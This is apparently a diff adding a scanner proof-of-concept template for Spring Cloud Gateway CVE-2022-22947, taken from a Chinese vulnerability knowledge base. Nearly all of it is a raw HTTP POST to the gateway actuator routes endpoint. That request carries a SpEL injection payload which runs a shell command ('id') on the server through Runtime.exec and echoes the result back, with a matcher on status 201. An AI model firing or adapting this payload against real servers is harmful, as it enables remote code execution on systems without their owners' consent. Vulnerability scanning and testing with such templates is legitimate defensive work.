@@ -1,0 +1,54 @@
+id: poc-zbugds8zeagwdx8t
+info:
+  name: Spring_CVE_2022_22947
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zbugds8zeagwdx8t'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zbugds8zeagwdx8t
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /actuator/gateway/routes/8Fn3ivs HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Accept-Language: en
+
+
+    Connection: close
+
+
+    Content-Type: application/json
+
+
+
+
+    {"id": "8Fn3ivs", "filters": [{"name": "AddResponseHeader", "args": {"name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}], "uri": "http://example.com"}
+
+
+    # 响应代码特征
+
+    201
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 201
+    type: status
